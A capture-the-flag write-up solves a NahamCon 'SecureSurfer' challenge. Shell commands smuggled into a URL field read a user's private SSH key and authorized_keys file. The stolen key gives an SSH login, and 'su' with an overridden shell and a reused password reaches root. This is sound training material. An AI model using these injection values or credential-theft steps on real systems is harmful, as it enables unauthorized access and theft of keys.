## misc/securesurfer

The tech influencers were right!! SSH for everything really is the future! With SecureSurfer, you can surf the world wide web... all through your terminal!

Escalate your privileges and run the program in the root user's home directory.

**Given:** securesurfer.c

```
# Password is "userpass"
ssh -p <port> user@challenge.nahamcon.com
```

## Solution

Connecting to SSH gives us securesurfer program instead of login shell. From `securesurfer.c`, we can see that our input is appended to a shell command.
By doing shell injection, we get remote shell as user `securesurfer` (even though we login as user `user`).

URL inputs with shell injection to get ssh keys,
```
https://invalid.domain/'; cat '/home/securesurfer/.ssh/id_ecdsa
https://invalid.domain/'; cat '/home/securesurfer/.ssh/id_ecdsa.pub
https://invalid.domain/'; cat '/home/securesurfer/.ssh/authorized_keys
```

SSH authorized_keys shows that `securesurfer` user can be authorized with its own key. So we can login as `securesurfer` in SSH to get an interactive shell.

```
ssh -p <port> -i id_ecdsa securesurfer@challenge.nahamcon.com
```

The flag.txt is present in `root` user directory. On exploring further for privilege escalation, turns out `root` user also has password as `userpass`. But login shell is set to invalid entry in `/etc/passwd`. At this point, we know following,

```
user: user
password: userpass
Shell: No
```
```
user: securesurfer
auth: id_ecdsa
Shell: Yes
```
```
user: root
auth: userpass
Shell: No
```

We cannot login as `root` via SSH as the login shell is invalid. However, we can SSH as `securesurfer` and use `su` command to switch to root by overriding the shell.

```
su -s /bin/bash root
password: userpass
```
